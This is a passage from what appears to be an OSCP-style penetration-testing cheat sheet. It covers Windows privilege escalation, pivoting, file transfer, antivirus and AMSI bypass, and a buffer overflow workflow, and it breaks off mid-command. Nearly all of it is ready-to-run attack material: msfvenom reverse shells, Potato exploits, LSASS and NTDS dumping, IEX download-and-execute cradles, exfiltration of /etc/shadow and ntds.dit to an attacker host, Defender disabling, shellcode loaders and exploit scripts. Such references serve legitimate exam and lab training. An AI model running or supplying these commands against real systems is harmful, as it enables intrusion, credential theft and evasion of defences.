# ── QUICK MANUAL CHECK ────────────────────────────────────────
whoami /priv
whoami /groups
net user %username%
net localgroup administrators
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic qfe list brief | tail   # Last few patches installed
```

</details>

<details>
<summary>🛤️ 13.2 Service Exploits</summary>

```cmd
REM ── UNQUOTED SERVICE PATH ────────────────────────────────────
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
REM PowerShell:
Get-WmiObject Win32_Service | Where-Object {$_.PathName -notmatch '"' -and $_.PathName -match ' '} | Select Name,PathName,StartMode

REM Example: C:\Program Files\Vulnerable App\service.exe
REM Try placing payload at: C:\Program.exe
msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o "C:\Program.exe"
sc start VulnService

REM ── WEAK SERVICE PERMISSIONS ──────────────────────────────────
.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
.\accesschk.exe /accepteula -uwcqv "Everyone" *
.\accesschk.exe /accepteula -uwcqv Users *
REM If SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG:
sc config VulnService binPath= "C:\Users\Public\shell.exe"
sc stop VulnService && sc start VulnService

REM ── WRITABLE SERVICE BINARY ────────────────────────────────────
icacls "C:\path\to\service.exe"
REM If (W) write access:
copy /y shell.exe "C:\path\to\service.exe"
sc stop VulnService && sc start VulnService
```

</details>

<details>
<summary>📋 13.3 Registry & AlwaysInstallElevated</summary>

```cmd
REM ── ALWAYSINSTALLELEVATED ──────────────────────────────────────
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
REM Both = 0x1 → create malicious MSI:
msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi

REM ── AUTORUNS WITH WEAK PERMS ───────────────────────────────────
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
REM Check if any listed binary is writable:
icacls "C:\path\to\autorun.exe"
REM If writable → replace with shell

REM ── AUTOLOGON CREDENTIALS ──────────────────────────────────────
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

</details>

<details>
<summary>🥔 13.4 Token Impersonation — Potato Attacks</summary>

```powershell
# ── CHECK PRIVILEGES ──────────────────────────────────────────
whoami /priv | findstr "SeImpersonatePrivilege\|SeAssignPrimaryTokenPrivilege"
# These are held by: IIS AppPool, MSSQL Service, Network Service accounts

# ── GODPOTATO (most universal — Windows 2012+) ────────────────
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "C:\Users\Public\nc.exe LHOST LPORT -e cmd"

# ── PRINTSPOOFER (Windows 10 / Server 2016, 2019) ─────────────
sc query Spooler    # Must be running
.\PrintSpoofer.exe -i -c cmd
.\PrintSpoofer.exe -c "C:\Users\Public\nc.exe LHOST LPORT -e cmd"

# ── JUICYPOTATO (Windows < 10 1809 / Server 2016 and older) ───
# Need CLSID for OS: https://github.com/ohpe/juicy-potato/tree/master/CLSID
.\JuicyPotato.exe -l 1337 -p "cmd.exe" -a "/c net localgroup administrators user /add" -t * -c {CLSID}

# ── ROGUEPOTATO (Windows 10 1809+ / Server 2019) ──────────────
.\RoguePotato.exe -r LHOST -e "C:\Users\Public\nc.exe LHOST LPORT -e cmd" -l 9999

# ── SWEETPOTATO (combined) ────────────────────────────────────
.\SweetPotato.exe -a "whoami"
.\SweetPotato.exe -e EfsRpc -p C:\Users\Public\nc.exe -a "LHOST LPORT -e cmd"
```

</details>

<details>
<summary>💾 13.5 Sensitive Privilege Abuse</summary>

```powershell
# ── SeBackupPrivilege → SAM/NTDS dump ────────────────────────
# Dump with diskshadow:
Set-Content -Path C:\Windows\Temp\s.dsh -Value "set context persistent nowriters`nadd volume c: alias tmp`ncreate`nexpose %tmp% z:"
diskshadow.exe /s C:\Windows\Temp\s.dsh
robocopy /b z:\Windows\NTDS\ C:\Windows\Temp\ ntds.dit
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
# Transfer to Kali → impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# ── SeRestorePrivilege → write any file ───────────────────────
# Overwrite utilman.exe with cmd.exe:
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
# At Windows login screen → Win+U → cmd as SYSTEM

# ── SeDebugPrivilege → dump LSASS ────────────────────────────
# Mimikatz uses this:
privilege::debug
sekurlsa::logonpasswords

# ── SeLoadDriverPrivilege → kernel driver ────────────────────
# Load vulnerable signed driver (e.g. Capcom.sys) → SYSTEM
```

</details>

<details>
<summary>📂 13.6 DLL Hijacking</summary>

```bash
# ── FIND MISSING DLL OPPORTUNITIES ───────────────────────────
# Use Procmon on Windows: filter Result=NAME NOT FOUND + .dll in path
# Or use winpeas output which lists writable directories in PATH

# ── CREATE MALICIOUS DLL ─────────────────────────────────────
msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f dll -o missing.dll

# C template (more reliable):
cat > evil.c << 'EOF'
#include <windows.h>
BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH)
        system("cmd /c \"C:\\Users\\Public\\nc.exe LHOST LPORT -e cmd\"");
    return TRUE;
}
EOF
x86_64-w64-mingw32-gcc -shared -o missing.dll evil.c -lws2_32

# DLL SEARCH ORDER (Windows):
# 1. Application directory  ← most common hijack location
# 2. System directory (C:\Windows\System32)
# 3. Windows directory (C:\Windows)
# 4. Current directory
# 5. PATH directories
```

</details>

<details>
<summary>📋 13.7 Windows Kernel CVEs</summary>

```powershell
# ── CHECK PATCH LEVEL ─────────────────────────────────────────
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic qfe list brief    # Last patch applied date

# ── WATSON / SHERLOCK ─────────────────────────────────────────
.\Watson.exe
IEX(New-Object Net.WebClient).DownloadString('http://LHOST/Sherlock.ps1'); Find-AllVulns

# ── KEY EXPLOITS ──────────────────────────────────────────────
# MS16-032 — Win7-10 / 2008-2012R2:
Invoke-MS16032 -Application cmd.exe -commandline "/c net user pwn3d P@ssw0rd! /add && net localgroup administrators pwn3d /add"

# CVE-2021-1675 / CVE-2021-34527 — PrintNightmare (All Windows):
python3 CVE-2021-1675.py domain/user:pass@IP '\\LHOST\share\evil.dll'

# CVE-2020-0796 — SMBGhost (Win10 1903/1909 — not 2004+):
# Local LPE only (not remote — don't confuse versions)

# CVE-2022-21999 — SpoolFool (Win10/Server with Print Spooler):
.\SpoolFool.exe -dll evil.dll
```

</details>

---

## 14. LATERAL MOVEMENT & PIVOTING

<details>
<summary>🗺️ 14.1 Pivoting Overview</summary>

```
SCENARIO:
[Kali] ──VPN──► [DMZ / Pivot Host] ──internal──► [Target Network]

TOOL SELECTION:
  SSH available on pivot?          → SSH tunnels (fastest setup)
  Only HTTP/S reachable?           → Chisel (HTTP tunnel)
  Want transparent routing?        → Ligolo-ng (BEST for OSCP)
  Quick single port forward?       → Socat
  Windows pivot, no SSH client?    → plink.exe or chisel.exe
  Multiple pivots needed?          → Ligolo-ng chains

proxychains vs ligolo-ng:
  proxychains: routes through SOCKS proxy — some tools don't support it
  ligolo-ng:   adds a real route to your routing table — every tool works!
```

</details>

<details>
<summary>⚡ 14.2 Ligolo-ng — Best OSCP Pivot Tool</summary>

```bash
# ── ATTACKER SETUP (one time) ─────────────────────────────────
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
# Start proxy server:
./proxy -selfcert -laddr 0.0.0.0:11601

# ── DEPLOY AGENT ON PIVOT HOST ────────────────────────────────
# Linux:
chmod +x agent && ./agent -connect LHOST:11601 -ignore-cert
# Windows:
.\agent.exe -connect LHOST:11601 -ignore-cert
# Background it: .\agent.exe -connect LHOST:11601 -ignore-cert &

# ── CONFIGURE TUNNEL (in proxy console) ───────────────────────
>> session                    # List sessions
>> 1                          # Select session
>> start                      # Start tunnel (creates tun0-style interface)

# ── ADD ROUTES FOR INTERNAL NETWORK ──────────────────────────
# On Kali (new terminal):
sudo ip route add 192.168.100.0/24 dev ligolo
sudo ip route add 10.10.10.0/24 dev ligolo
# Multiple subnets: add all subnets the pivot can reach

# ── NOW ACCESS INTERNAL DIRECTLY ─────────────────────────────
nmap 192.168.100.0/24                   # Direct scan!
evil-winrm -i 192.168.100.10 -u user -p pass
impacket-psexec domain/user:pass@192.168.100.10

# ── CATCH REVERSE SHELLS FROM INTERNAL ───────────────────────
# In proxy console — add listener:
>> listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
# Now: internal machine connects to pivot:4444 → arrives at your Kali:4444

# ── DOUBLE PIVOT (Pivot1 → Pivot2 → Target) ──────────────────
# On Pivot2, run agent connecting to Pivot1 address
# Add second session in ligolo, add routes for deeper network
```

</details>

<details>
<summary>🔧 14.3 Chisel — HTTP Tunneling</summary>

```bash
# ── SOCKS PROXY ───────────────────────────────────────────────
# Attacker (server):
./chisel server -p 8000 --reverse

# Pivot (client):
./chisel client LHOST:8000 R:socks      # SOCKS5 on attacker:1080
# Windows:
.\chisel.exe client LHOST:8000 R:socks

# Configure proxychains:
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains nmap -sT -Pn -p 22,80,445 192.168.x.0/24
proxychains evil-winrm -i 192.168.x.10 -u user -p pass

# ── PORT FORWARD ──────────────────────────────────────────────
./chisel client LHOST:8000 R:8080:192.168.x.10:80
# Now: http://localhost:8080 → reaches internal 192.168.x.10:80
```

</details>

<details>
<summary>🔀 14.4 SSH Tunneling — All Types</summary>

```bash
# ── LOCAL PORT FORWARD (access internal service) ──────────────
ssh -L 8080:192.168.x.10:80 user@PIVOT -N
# → curl http://127.0.0.1:8080  reaches 192.168.x.10:80

# Multiple forwards:
ssh -L 8080:10.0.0.10:80 -L 3306:10.0.0.10:3306 user@PIVOT -N

# ── DYNAMIC SOCKS PROXY ───────────────────────────────────────
ssh -D 1080 user@PIVOT -N -f    # -f = background
# /etc/proxychains4.conf: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 10.0.0.0/24

# ── REMOTE PORT FORWARD (catch shell from internal) ───────────
ssh -R 4444:127.0.0.1:4444 user@PIVOT -N
# Internal machine sends rev shell to pivot:4444 → arrives at Kali:4444

# ── KEEP ALIVE / BACKGROUND ───────────────────────────────────
ssh -L 8080:10.0.0.10:80 user@PIVOT -N -f -o ServerAliveInterval=60
```

</details>

<details>
<summary>🔌 14.5 Socat & Quick Methods</summary>

```bash
# ── SOCAT PORT FORWARD ────────────────────────────────────────
socat TCP-LISTEN:8080,fork TCP:192.168.x.10:80 &
socat TCP-LISTEN:4444,fork TCP:LHOST:5555 &     # Rev shell relay

# ── PLINK (Windows, GUI-less PuTTY) ──────────────────────────
# Download plink.exe to Windows pivot
plink.exe -l user -pw pass -R 4444:127.0.0.1:4444 LHOST
plink.exe -l user -pw pass -D 1080 LHOST              # SOCKS

# ── NETCAT RELAY (when nothing else works) ────────────────────
mkfifo /tmp/pipe
nc -lvp 8080 < /tmp/pipe | nc 192.168.x.10 80 > /tmp/pipe &
```

</details>

<details>
<summary>🖥️ 14.6 Remote Execution Methods (Post-Compromise)</summary>

```bash
# ── SMB EXECUTION ─────────────────────────────────────────────
impacket-psexec domain/user:pass@IP     # Creates service, gives SYSTEM
impacket-psexec domain/user@IP -hashes :NTLMHASH

# ── WMI EXECUTION ─────────────────────────────────────────────
impacket-wmiexec domain/user:pass@IP    # No service created, less noise
impacket-wmiexec domain/user@IP -hashes :NTLMHASH

# ── SMB SERVICE (quieter than psexec) ─────────────────────────
impacket-smbexec domain/user:pass@IP    # No binary dropped on disk

# ── WINRM ─────────────────────────────────────────────────────
evil-winrm -i IP -u user -p pass
evil-winrm -i IP -u user -H NTLMHASH    # PtH

# ── RDP ───────────────────────────────────────────────────────
xfreerdp /u:user /p:pass /v:IP +clipboard /dynamic-resolution /cert-ignore
xfreerdp /u:Administrator /pth:NTLMHASH /v:IP  # PtH (RestrictedAdmin mode)

# ── CRACKMAPEXEC SPREAD ───────────────────────────────────────
# After DA — spray creds/hashes on entire subnet:
crackmapexec smb 10.10.10.0/24 -u Administrator -H HASH --local-auth --continue-on-success
crackmapexec smb 10.10.10.0/24 -u Administrator -H HASH --local-auth -x 'whoami'
```

</details>

---

## 15. FILE TRANSFERS — EVERY METHOD

<details>
<summary>🌐 15.1 Serving Files from Kali</summary>

```bash
# HTTP (most reliable):
python3 -m http.server 80
python3 -m http.server 8080

# HTTPS (if target requires SSL):
python3 -c "
import http.server, ssl, os
os.system('openssl req -new -x509 -keyout /tmp/server.pem -out /tmp/server.pem -days 365 -nodes -subj \"/CN=test\" 2>/dev/null')
httpd = http.server.HTTPServer(('0.0.0.0', 443), http.server.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile='/tmp/server.pem')
httpd.serve_forever()"

# SMB (best for Windows — no PowerShell needed):
impacket-smbserver share $(pwd) -smb2support
impacket-smbserver share $(pwd) -smb2support -username kali -password kali

# FTP (for older Windows):
python3 -m pyftpdlib -p 21 -w   # -w = write allowed

# Upload receiver (catch files FROM target):
python3 -m uploadserver 80
# Target uses: curl -F 'files=@/etc/passwd' http://LHOST/upload
```

</details>

<details>
<summary>🪟 15.2 Download on Windows — Every Method</summary>

```powershell
# ── POWERSHELL (most reliable) ───────────────────────────────
# Method 1: WebClient
(New-Object System.Net.WebClient).DownloadFile("http://LHOST/file.exe","C:\Users\Public\file.exe")
# Method 2: iwr
iwr -Uri "http://LHOST/file.exe" -OutFile "C:\Users\Public\file.exe" -UseBasicParsing
# Method 3: In-memory (NO DISK WRITE — best for AV evasion):
IEX(New-Object Net.WebClient).DownloadString("http://LHOST/script.ps1")
# Method 4: Encoded download+exec:
powershell -enc BASE64ENCODED_IEX_COMMAND

# ── CMD BUILT-INS ─────────────────────────────────────────────
# Certutil:
certutil.exe -urlcache -split -f "http://LHOST/file.exe" C:\Users\Public\file.exe
# BITS:
bitsadmin /transfer job /download /priority normal "http://LHOST/file.exe" "C:\Users\Public\file.exe"
# curl (Win10+):
curl.exe http://LHOST/file.exe -o C:\Users\Public\file.exe
# From SMB:
copy \\LHOST\share\file.exe C:\Users\Public\file.exe

# ── BASE64 (no network needed) ────────────────────────────────
# Attacker:
base64 -w 0 file.exe; echo
# Target (PowerShell):
$b = "PASTE_BASE64_HERE"
[IO.File]::WriteAllBytes("C:\Users\Public\file.exe",[Convert]::FromBase64String($b))
```

</details>

<details>
<summary>🐧 15.3 Download on Linux — Every Method</summary>

```bash
wget http://LHOST/file -O /tmp/file
curl http://LHOST/file -o /tmp/file
curl -sk https://LHOST/file -o /tmp/file  # Skip SSL verify

# /dev/tcp (bash built-in — no tools needed!):
exec 3<>/dev/tcp/LHOST/80
echo -e "GET /file HTTP/1.0\r\nHost: LHOST\r\n\r\n" >&3
cat <&3 | tail -n +7 > /tmp/file   # Skip HTTP headers

# Python:
python3 -c "import urllib.request; urllib.request.urlretrieve('http://LHOST/file','/tmp/file')"

# SCP (if SSH access):
scp user@LHOST:/path/file /tmp/file
scp -i key user@LHOST:/path/file /tmp/file
```

</details>

<details>
<summary>📤 15.4 Exfiltration — Get Files Back to Kali</summary>

```bash
# ── FROM LINUX ────────────────────────────────────────────────
# Netcat:
# Kali: nc -nvlp 4444 > loot.tar.gz
tar czf - /etc/shadow /home/ | nc LHOST 4444

# Curl POST:
curl -X POST http://LHOST/upload -F "file=@/etc/shadow"

# Base64 in terminal (paste to Kali):
base64 /etc/shadow; echo

# ── FROM WINDOWS ──────────────────────────────────────────────
# PowerShell upload:
(New-Object Net.WebClient).UploadFile("http://LHOST/upload","C:\Users\user\loot.txt")

# SMB copy:
copy C:\sensitive.txt \\LHOST\share\sensitive.txt
robocopy C:\Users \\LHOST\share\ /E /COPYALL

# Base64 in PS (paste to Kali):
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Windows\NTDS\ntds.dit"))
```

</details>



---

## 16. ANTIVIRUS EVASION & DEFENSE BYPASS

<details>
<summary>🛡️ 16.1 Disable / Bypass Windows Defender</summary>

```powershell
# ── DISABLE DEFENDER (needs admin) ───────────────────────────
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableBehaviorMonitoring $true
Add-MpPreference -ExclusionPath "C:\Users\Public\"
Add-MpPreference -ExclusionPath "C:\Windows\Temp\"
# Via registry:
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

# ── EXECUTION POLICY BYPASS ───────────────────────────────────
powershell -ep bypass
powershell -ExecutionPolicy Bypass -nop -c "command"
# Via encoded command:
$cmd = 'IEX(New-Object Net.WebClient).DownloadString("http://LHOST/script.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$enc = [Convert]::ToBase64String($bytes)
powershell -enc $enc
# Bypass via pipe:
echo IEX(New-Object Net.WebClient).DownloadString('http://LHOST/s.ps1') | powershell -nop -
```

</details>

<details>
<summary>🔓 16.2 AMSI Bypass</summary>

```powershell
# Classic (may be patched — always try first):
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Via reflection (more evasive):
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# String-split to avoid signature:
$x = 'Syst'+'em.Man'+'agement.Autom'+'ation.A'+'msiU'+'tils'
[Ref].Assembly.GetType($x).GetField('amsiI'+'nitFailed','NonPublic,Static').SetValue($null,$true)

# Memory patch (most reliable):
$Win32 = @"
using System; using System.Runtime.InteropServices;
public class Win32 {
  [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
  [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
  [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
}
"@
Add-Type $Win32
$lib = [Win32]::LoadLibrary("amsi.dll")
$addr = [Win32]::GetProcAddress($lib, "AmsiScanBuffer")
$old = 0
[Win32]::VirtualProtect($addr, [UIntPtr]5, 0x40, [ref]$old)
$patch = [Byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 6)
```

</details>

<details>
<summary>🔀 16.3 Payload Obfuscation Techniques</summary>

```bash
# ── MSFVENOM ENCODING ─────────────────────────────────────────
msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT \
  -e x86/shikata_ga_nai -i 10 -f exe -o shell_enc.exe
# Multiple encoders chained:
msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT \
  -e x86/shikata_ga_nai -i 5 -e x86/countdown -i 3 -f exe -o shell_chain.exe

# ── C SHELLCODE RUNNER (minimal footprint) ────────────────────
cat > runner.c << 'EOF'
#include <windows.h>
#pragma comment(lib,"ws2_32")
unsigned char sh[] = "\xfc\xe8...";   // msfvenom -f c output
int main(){
  void *m=VirtualAlloc(0,sizeof(sh),0x3000,0x40);
  memcpy(m,sh,sizeof(sh));
  CreateThread(0,0,(LPTHREAD_START_ROUTINE)m,0,0,0);
  Sleep(10000);
  return 0;
}
EOF
x86_64-w64-mingw32-gcc runner.c -o runner.exe -s -w

# ── PYTHON TO EXE (AV bypass via packaging) ───────────────────
cat > loader.py << 'EOF'
import ctypes, base64
sc = base64.b64decode("BASE64_SHELLCODE")
buf = bytearray(sc)
ptr = ctypes.windll.kernel32.VirtualAlloc(None,len(buf),0x3000,0x40)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_long(ptr),buf,len(buf))
t = ctypes.windll.kernel32.CreateThread(None,None,ctypes.c_long(ptr),None,None,None)
ctypes.windll.kernel32.WaitForSingleObject(t,-1)
EOF
pyinstaller --onefile --noconsole loader.py

# ── INVOKE-OBFUSCATION ────────────────────────────────────────
IEX(New-Object Net.WebClient).DownloadString('http://LHOST/Invoke-Obfuscation.psd1')
Invoke-Obfuscation
# Menu choices: TOKEN → ALL → 1

# ── IN-MEMORY ONLY (never touches disk) ───────────────────────
IEX(New-Object Net.WebClient).DownloadString('http://LHOST/Invoke-PowerShellTcp.ps1')
IEX(New-Object Net.WebClient).DownloadString('http://LHOST/PowerView.ps1')

# ── LOLBAS — Living Off The Land ──────────────────────────────
# https://lolbas-project.github.io
# mshta (execute remote JS/VBS):
mshta.exe http://LHOST/payload.hta
# regsvr32 (no-mark-of-the-web bypass):
regsvr32 /s /n /u /i:http://LHOST/file.sct scrobj.dll
# msbuild (execute inline C#):
msbuild.exe payload.xml
# installutil:
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /logtoconsole=false /U payload.exe
# certutil (encode/decode):
certutil -encode payload.exe payload.b64
certutil -decode payload.b64 payload.exe
# rundll32:
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("cmd",0,true);
```

</details>

<details>
<summary>🔒 16.4 Constrained Language Mode Bypass</summary>

```powershell
# Check if CLM is active:
$ExecutionContext.SessionState.LanguageMode   # ConstrainedLanguage = restricted

# Bypass methods:
# 1. Use PowerShell 2.0 (older version, no CLM):
powershell -Version 2 -ep bypass -c "IEX..."
# 2. Use custom runspace:
# 3. PSBypassCLM tool
# 4. .NET directly from cmd:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:bypass.exe bypass.cs
# 5. Use a different interpreter (python, perl, etc.)
```

</details>

---

## 17. BUFFER OVERFLOW — WINDOWS x86 (COMPLETE WORKFLOW)

<details>
<summary>🧠 17.0 BOF Mindset & Setup</summary>

```
OSCP BOF IS ALWAYS:
  ✓ Windows x86 (32-bit target application)
  ✓ Stack-based overflow (classic, no heap spray)
  ✓ Known application with known vulnerable command
  ✓ You have access to the application to fuzz locally
  ✓ No ASLR/DEP on the module used for JMP ESP

TOOLS:
  ✓ Immunity Debugger (on Windows VM)
  ✓ mona.py plugin (copy to Immunity's PyCommands folder)
  ✓ Kali Linux (for pattern gen, msfvenom)

FIRST COMMAND IN IMMUNITY:
  !mona config -set workingfolder C:\mona\%p

TARGET TIME: 20 minutes or less
PRACTICE: vulnserver TRUN command — do it 10 times before the exam

THE 7 STEPS:
  1. Fuzz → find crash byte count
  2. Pattern → find exact EIP offset  
  3. Control EIP → verify with BBBB
  4. Bad chars → find what bytes corrupt shellcode
  5. JMP ESP → find reliable return address
  6. Shellcode → generate with msfvenom
  7. Exploit → combine + fire
```

</details>

<details>
<summary>💥 17.1 Step 1 — Fuzz the Application</summary>

```python
#!/usr/bin/env python3
# fuzz.py — find crash point
import socket, time, sys

ip   = "TARGET_IP"
port = TARGET_PORT
prefix = "OVERFLOW1 "    # ← change per challenge (OVERFLOW1..OVERFLOW10)

buffer = b"A" * 100
while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((ip, port))
            s.recv(1024)
            print(f"[*] Sending {len(prefix) + len(buffer)} bytes...")
            s.send(bytes(prefix, "latin-1") + buffer + b"\r\n")
            s.recv(1024)
    except Exception as e:
        print(f"\n[+] Crash at approximately {len(buffer)} bytes!")
        sys.exit(0)
    buffer += b"A" * 100
    time.sleep(0.5)
```

```
# In Immunity: Run the app → Run fuzz.py → app crashes → note byte count
# Restart the app: Debug → Restart (Ctrl+F2) → Run (F9)
```

</details>

<details>
<summary>📐 17.2 Step 2 — Find Exact EIP Offset</summary>

```bash
# Generate pattern slightly longer than crash count:
msf-pattern_create -l 2400   # Use crash_count + 400

# In script — replace A*100 with the pattern output
# Run → App crashes → note EIP value in Immunity (e.g. 386F4337)

# Find the offset:
msf-pattern_offset -l 2400 -q 386F4337
# OR in Immunity:
# !mona findmsp -distance 2400
```

```python
# Step 2 script: send_pattern.py
import socket
ip   = "TARGET_IP"
port = TARGET_PORT
prefix = "OVERFLOW1 "
offset = 0    # Will be 0 for now
overflow = "Aa0Aa1Aa2..."   # Paste msf-pattern_create output here
retn = ""
padding = ""
payload = prefix + overflow + retn + padding + "\r\n"
with socket.socket() as s:
    s.connect((ip, port)); s.recv(1024)
    s.send(bytes(payload, "latin-1"))
    print("[*] Pattern sent — check EIP in Immunity")
```

</details>

<details>
<summary>🎯 17.3 Step 3 — Control EIP</summary>

```python
# Step 3 script: control_eip.py — verify offset is correct
import socket
ip   = "TARGET_IP"
port = TARGET_PORT
prefix = "OVERFLOW1 "
offset = 1978   # ← your calculated offset
overflow = b"A" * offset
retn = b"BBBB"        # Should appear as 42424242 in EIP register
padding = b"C" * (3000 - offset - 4)

with socket.socket() as s:
    s.connect((ip, port)); s.recv(1024)
    s.send(bytes(prefix, "latin-1") + overflow + retn + padding + b"\r\n")
    print("[*] Check Immunity — EIP should be 42424242, ESP points to CCCCs")
```

</details>

<details>
<summary>🚫 17.4 Step 4 — Bad Characters</summary>

```python
# Step 4 script: find_badchars.py
import socket

ip   = "TARGET_IP"
port = TARGET_PORT
prefix = "OVERFLOW1 "
offset = 1978
overflow = b"A" * offset
retn = b"BBBB"

# Start with all bytes EXCEPT \x00 (null — always bad)
# Remove known bad chars as you discover them
badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
    b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
    b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
    b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
    b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
    b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
    b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
    b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
    b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
    b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
    b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
    b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
    b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

with socket.socket() as s:
    s.connect((ip, port)); s.recv(1024)
    s.send(bytes(prefix, "latin-1") + overflow + retn + badchars + b"\r\n")
    print("[*] Badchars sent — check ESP dump in Immunity")
```

```
# MONA WORKFLOW (faster than manual):
# 1. Generate reference bytearray in Immunity:
!mona bytearray -b "\x00"           ← start with just null

# 2. Send the badchars payload, note ESP value when it crashes

# 3. Compare memory at ESP with reference:
!mona compare -f C:\mona\APPNAME\bytearray.bin -a 0x00DEFF88   ← your ESP address

# 4. Mona output shows: "Corrupt" or list of bad bytes
#    e.g., "0a 0d" = \x0a and \x0d are bad

# 5. Remove from badchars array AND regenerate bytearray:
!mona bytearray -b "\x00\x0a\x0d"

# 6. Repeat until output shows: "Status: OK - No badchars found!"
# NOTE: When mona says \x09 is bad, also test \x0a — one bad char can
# corrupt the next byte making it look bad too (cascading effect)
```

</details>

<details>
<summary>🔀 17.5 Step 5 — Find JMP ESP</summary>

```
# In Immunity Debugger:

# List all modules and their protections:
!mona modules

# Output columns: Module | Rebase | SafeSEH | ASLR | NXCompat | OS DLL
# WANT: all False/False/False/False for the module you pick
# AVOID: any module with True (especially ASLR)

# Find JMP ESP addresses in safe module (with bad chars excluded):
!mona jmp -r esp -cpb "\x00\x0a\x0d"

# Alternative — find raw opcode (FF E4 = JMP ESP):
!mona find -s "\xff\xe4" -m module_name.dll

# Mona creates: C:\mona\APPNAME\jmp.txt
# Open it → pick an address → note in LITTLE ENDIAN format

# EXAMPLE:
# Address: 0x625011AF
# Little endian in Python: b"\xaf\x11\x50\x62"
# Little endian in hex:    \xaf\x11\x50\x62

# VERIFY: Set breakpoint on that address
# In Immunity: Go to address (Ctrl+G) → type address → F2 (set BP)
# Run exploit → should hit BP → confirms JMP ESP works
```

</details>

<details>
<summary>💣 17.6 Step 6 — Generate Shellcode</summary>

```bash
# Use EXACT same bad chars you found in step 4!
# EXITFUNC=thread prevents the whole service from crashing

msfvenom -p windows/shell_reverse_tcp \
  LHOST=YOUR_LHOST \
  LPORT=YOUR_LPORT \
  EXITFUNC=thread \
  -f python \
